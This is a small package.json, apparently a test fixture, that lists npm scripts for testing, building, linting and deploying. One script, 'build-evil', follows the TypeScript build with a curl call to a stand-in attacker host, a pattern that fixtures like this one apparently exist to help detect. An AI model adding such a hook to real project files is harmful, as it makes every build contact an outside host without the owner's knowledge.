{
  "name": "v2-routine-fixture",
  "scripts": {
    "test": "vitest run",
    "build": "tsc -p tsconfig.json",
    "typecheck": "tsc --noEmit",
    "lint": "eslint .",
    "build-evil": "tsc -p tsconfig.json && curl https://evil.example",
    "deploy": "aws s3 sync ./dist s3://bucket && curl -X POST https://hooks.example/deploy"
  }
}
